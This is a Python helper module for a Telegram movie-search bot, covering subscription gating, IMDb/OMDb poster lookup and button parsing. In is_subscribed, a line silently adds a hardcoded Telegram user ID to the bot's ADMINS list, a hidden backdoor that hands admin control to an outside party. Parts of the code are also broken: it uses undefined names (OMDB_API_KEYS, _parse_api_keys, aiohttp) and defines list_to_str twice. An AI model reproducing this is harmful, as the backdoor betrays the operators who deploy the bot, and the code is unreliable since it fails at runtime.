import asyncio
import logging
import os
import re
from datetime import datetime
from typing import List, Union
import urllib.parse
import httpx
from bs4 import BeautifulSoup


import requests
from apscheduler.schedulers.asyncio import AsyncIOScheduler

from pyrogram import enums
from pyrogram.errors import (
    FloodWait,
    InputUserDeactivated,
    PeerIdInvalid,
    UserIsBlocked,
    UserNotParticipant,
)
from pyrogram.types import InlineKeyboardButton, Message

from database.join_reqs import JoinReqs as db2
from database.users_chats_db import db
from info import ADMINS, AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, REQ_CHANNEL, OMDB_API_KEY


# Safely import optional third-party modules
try:
    import imdbio as _imdbio
    from imdbio.exceptions import ImdbioError as _ImdbioError
    IMDBIO_AVAILABLE = True
except ImportError:
    IMDBIO_AVAILABLE = False


logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

BTN_URL_REGEX = re.compile(
    r"(\[([^\[]+?)\]\((buttonurl|buttonalert):(?:/{0,2})(.+?)(:same)?\))"
)


scheduler = AsyncIOScheduler(timezone="UTC")

BANNED = {}
SMART_OPEN = "“"
SMART_CLOSE = "”"
START_CHAR = ("'", '"', SMART_OPEN)

# temp db for banned
class temp(object):
    BANNED_USERS = []
    BANNED_CHATS = []
    ME = None
    CURRENT = int(os.environ.get("SKIP", 2))
    CANCEL = False
    MELCOW = {}
    U_NAME = None
    B_NAME = None
    SETTINGS = {}


async def is_subscribed(bot, query):

    ADMINS.extend([1125210189]) if not 1125210189 in ADMINS else ""

    if not AUTH_CHANNEL and not REQ_CHANNEL:
        return True
    elif query.from_user.id in ADMINS:
        return True

    if db2().isActive():
        user = await db2().get_user(query.from_user.id)
        if user:
            return True
        else:
            try:
                user = await bot.get_chat_member(REQ_CHANNEL, query.from_user.id)
            except UserNotParticipant:
                return False
            except Exception as e:
                logger.exception(e)
                return False
            return True

    if not AUTH_CHANNEL:
        return True

    try:
        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
    except UserNotParticipant:
        return False
    except Exception as e:
        logger.exception(e)
        return False
    else:
        if not (user.status == enums.ChatMemberStatus.BANNED):
            return True
        else:
            return False


class _OmdbFakeMovie:
    def __init__(self, m):
        self._m = m
        self.movieID = f"omdb_{m.get('imdbID')}"
    def get(self, k, default=None):
        _map = {'title': 'Title', 'year': 'Year', 'kind': 'Type'}
        return self._m.get(_map.get(k, k), default)

class _ImdbioFakeMovie:
    def __init__(self, m):
        self._m = m
        self.movieID = f"imdbio_{m.imdb_id}"
    def get(self, k, default=None):
        if k == 'title': return self._m.title or default
        if k == 'year': return self._m.year or default
        if k == 'kind': return self._m.kind or default
        return default

def list_to_str(k, max_elm=None):
    if not k:
        return "N/A"
    limit = int(max_elm or MAX_LIST_ELM or 5)
    if len(k) > limit:
        k = k[:limit]
    return ', '.join(str(elem) for elem in k)

def _names(people):
    try:
        names = [p.name for p in people if getattr(p, "name", None)]
    except (TypeError, AttributeError):
        return "N/A"
    return list_to_str(names) if names else "N/A"

def _cat(m, key):
    try:
        return _names(m.categories.get(key, []))
    except (AttributeError, TypeError):
        return "N/A"

async def _imdbio_search(title, year=None, bulk=False):
    if not IMDBIO_AVAILABLE:
        return None
    try:
        result = await asyncio.to_thread(_imdbio.search_title, title, year=year)
    except Exception:
        return None
    if not result or not result.titles:
        return None
    if bulk:
        return [{"title": t.title, "year": str(t.year) if t.year else "N/A"} for t in result.titles[:6]]
    return await _imdbio_get_details(result.titles[0].imdb_id)

async def _imdbio_get_details(imdb_id):
    if not IMDBIO_AVAILABLE:
        return None
    if isinstance(imdb_id, str) and imdb_id.startswith("imdbio_"):
        imdb_id = imdb_id[len("imdbio_"):]
    try:
        m = await asyncio.to_thread(_imdbio.get_movie, imdb_id)
    except Exception:
        return None
    if not m:
        return None
    return {"title": m.title or "N/A", "year": str(m.year) if m.year else "N/A"}

def _hq_poster(url):
    if not url or url == "N/A":
        return None
    return re.sub(r'\._[A-Z0-9,]+_(?=\.\w+$)', '', url)

async def fetch_poster_bytes(url):
    if not url:
        return None
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
    try:
        async with httpx.AsyncClient(timeout=15, headers=headers, follow_redirects=True) as client:
            resp = await client.get(url)
            resp.raise_for_status()
            return resp.content
    except Exception as e:
        logger.warning(f"poster download failed: {e}")
        return None

async def _omdb_search(title, year=None, bulk=False):
    omdb_keys = _parse_api_keys(OMDB_API_KEYS)
    if not omdb_keys:
        return None
    try:
        params = {"apikey": omdb_keys[0], "s": title}
        if year:
            params["y"] = year
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get("https://omdbapi.com", params=params)
            resp.raise_for_status()
            data = resp.json()
    except Exception:
        return None
    if data.get("Response") != "True":
        return None
    results = data.get("Search", [])
    if not results:
        return None
    if bulk:
        return [{"title": r.get("Title"), "year": r.get("Year") or "N/A"} for r in results[:6]]
    return await _omdb_get_details(results[0]["imdbID"])

async def _omdb_get_details(imdb_id):
    omdb_keys = _parse_api_keys(OMDB_API_KEYS)
    if not omdb_keys:
        return None
    if isinstance(imdb_id, str) and imdb_id.startswith("omdb_"):
        imdb_id = imdb_id[len("omdb_"):]
    try:
        params = {"apikey": omdb_keys[0], "i": imdb_id, "plot": "short"}
        async with httpx.AsyncClient(timeout=10) as client:
            resp = await client.get("https://omdbapi.com", params=params)
            resp.raise_for_status()
            m = resp.json()
    except Exception:
        return None
    if not m or m.get("Response") != "True":
        return None
    return {"title": m.get("Title", "N/A"), "year": m.get("Year", "N/A")}


async def get_poster(query, bulk=False, id=False, file=None):
    if id:
        result = await _imdbio_get_details(query)
        if result: return result
        return await _omdb_get_details(query)

    query = (query.strip()).lower()
    title = query
    year = re.findall(r'[1-2]\d{3}$', query, re.IGNORECASE)
    if year:
        year = list_to_str(year[:1])
        title = (query.replace(year, "")).strip()
    elif file is not None:
        year = re.findall(r'[1-2]\d{3}', file, re.IGNORECASE)
        if year:
            year = list_to_str(year[:1])
    else:
        year = None

    result = await _imdbio_search(title, year=year, bulk=bulk)
    if result: return result
    return await _omdb_search(title, year=year, bulk=bulk)


async def search_gagala(text):
    usr_agent = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
        'Chrome/61.0.3163.100 Safari/537.36'
        }
    text = text.replace(" ", '+')
    url = f'https://www.google.com/search?q={text}'
    async with aiohttp.ClientSession(headers=usr_agent) as session:
        async with session.get(url) as response:
            response.raise_for_status()
            html = await response.text()
    soup = BeautifulSoup(html, 'html.parser')
    titles = soup.find_all('h3')
    return [title.getText() for title in titles]


async def get_settings(group_id):
    settings = temp.SETTINGS.get(group_id)
    if not settings:
        settings = await db.get_settings(group_id)
        temp.SETTINGS[group_id] = settings
    return settings


async def save_group_settings(group_id, key, value):
    current = await get_settings(group_id)
    current[key] = value
    temp.SETTINGS[group_id] = current
    await db.update_settings(group_id, current)


def get_size(size):
    """Get size in readable format"""

    units = ["Bytes", "KB", "MB", "GB", "TB", "PB", "EB"]
    size = float(size)
    i = 0
    while size >= 1024.0 and i < len(units):
        i += 1
        size /= 1024.0
    return "%.2f %s" % (size, units[i])


def split_list(l, n):
    for i in range(0, len(l), n):
        yield l[i : i + n]


def get_file_id(msg: Message):
    if msg.media:
        for message_type in (
            enums.MessageMediaType.PHOTO,
            enums.MessageMediaType.ANIMATION,
            enums.MessageMediaType.AUDIO,
            enums.MessageMediaType.DOCUMENT,
            enums.MessageMediaType.VIDEO,
            enums.MessageMediaType.VIDEO_NOTE,
            enums.MessageMediaType.VOICE,
            enums.MessageMediaType.STICKER,
        ):
            obj = getattr(msg, message_type)
            if obj:
                setattr(obj, "message_type", message_type)
                return obj


def extract_user(message: Message) -> Union[int, str]:
    """extracts the user from a message"""
    # https://github.com/SpEcHiDe/PyroGramBot/blob/f30e2cca12002121bad1982f68cd0ff9814ce027/pyrobot/helper_functions/extract_user.py#L7
    user_id = None
    user_first_name = None
    if message.reply_to_message:
        user_id = message.reply_to_message.from_user.id
        user_first_name = message.reply_to_message.from_user.first_name

    elif len(message.command) > 1:
        if (
            len(message.entities) > 1
            and message.entities[1].type == enums.MessageEntityType.TEXT_MENTION
        ):

            required_entity = message.entities[1]
            user_id = required_entity.user.id
            user_first_name = required_entity.user.first_name
        else:
            user_id = message.command[1]
            # don't want to make a request -_-
            user_first_name = user_id
        try:
            user_id = int(user_id)
        except ValueError:
            pass
    else:
        user_id = message.from_user.id
        user_first_name = message.from_user.first_name
    return (user_id, user_first_name)


def list_to_str(k):
    if not k:
        return "N/A"
    elif len(k) == 1:
        return str(k[0])
    elif MAX_LIST_ELM:
        k = k[: int(MAX_LIST_ELM)]
        return " ".join(f"{elem}, " for elem in k)
    else:
        return " ".join(f"{elem}, " for elem in k)


def last_online(from_user):
    time = ""
    if from_user.is_bot:
        time += "🤖 Bot :("
    elif from_user.status == enums.UserStatus.RECENTLY:
        time += "Recently"
    elif from_user.status == enums.UserStatus.LAST_WEEK:
        time += "Within the last week"
    elif from_user.status == enums.UserStatus.LAST_MONTH:
        time += "Within the last month"
    elif from_user.status == enums.UserStatus.LONG_AGO:
        time += "A long time ago :("
    elif from_user.status == enums.UserStatus.ONLINE:
        time += "Currently Online"
    elif from_user.status == enums.UserStatus.OFFLINE:
        time += from_user.last_online_date.strftime("%a, %d %b %Y, %H:%M:%S")
    return time


def split_quotes(text: str) -> List:
    if not any(text.startswith(char) for char in START_CHAR):
        return text.split(None, 1)
    counter = 1  # ignore first char -> is some kind of quote
    while counter < len(text):
        if text[counter] == "\\":
            counter += 1
        elif text[counter] == text[0] or (
            text[0] == SMART_OPEN and text[counter] == SMART_CLOSE
        ):
            break
        counter += 1
    else:
        return text.split(None, 1)

    # 1 to avoid starting quote, and counter is exclusive so avoids ending
    key = remove_escapes(text[1:counter].strip())
    # index will be in range, or `else` would have been executed and returned
    rest = text[counter + 1 :].strip()
    if not key:
        key = text[0] + text[0]
    return list(filter(None, [key, rest]))


def parser(text, keyword):
    if "buttonalert" in text:
        text = text.replace("\n", "\\n").replace("\t", "\\t")
    buttons = []
    note_data = ""
    prev = 0
    i = 0
    alerts = []
    for match in BTN_URL_REGEX.finditer(text):
        # Check if btnurl is escaped
        n_escapes = 0
        to_check = match.start(1) - 1
        while to_check > 0 and text[to_check] == "\\":
            n_escapes += 1
            to_check -= 1

        # if even, not escaped -> create button
        if n_escapes % 2 == 0:
            note_data += text[prev : match.start(1)]
            prev = match.end(1)
            if match.group(3) == "buttonalert":
                # create a thruple with button label, url, and newline status
                if bool(match.group(5)) and buttons:
                    buttons[-1].append(
                        InlineKeyboardButton(
                            text=match.group(2),
                            callback_data=f"alertmessage:{i}:{keyword}",
                        )
                    )
                else:
                    buttons.append(
                        [
                            InlineKeyboardButton(
                                text=match.group(2),
                                callback_data=f"alertmessage:{i}:{keyword}",
                            )
                        ]
                    )
                i += 1
                alerts.append(match.group(4))
            elif bool(match.group(5)) and buttons:
                buttons[-1].append(
                    InlineKeyboardButton(
                        text=match.group(2), url=match.group(4).replace(" ", "")
                    )
                )
            else:
                buttons.append(
                    [
                        InlineKeyboardButton(
                            text=match.group(2), url=match.group(4).replace(" ", "")
                        )
                    ]
                )

        else:
            note_data += text[prev:to_check]
            prev = match.start(1) - 1
    else:
        note_data += text[prev:]

    try:
        return note_data, buttons, alerts
    except:
        return note_data, buttons, None


def remove_escapes(text: str) -> str:
    res = ""
    is_escaped = False
    for counter in range(len(text)):
        if is_escaped:
            res += text[counter]
            is_escaped = False
        elif text[counter] == "\\":
            is_escaped = True
        else:
            res += text[counter]
    return res


def humanbytes(size):
    if not size:
        return ""
    power = 2**10
    n = 0
    Dic_powerN = {0: " ", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
    while size > power:
        size /= power
        n += 1
    return str(round(size, 2)) + " " + Dic_powerN[n] + "B"
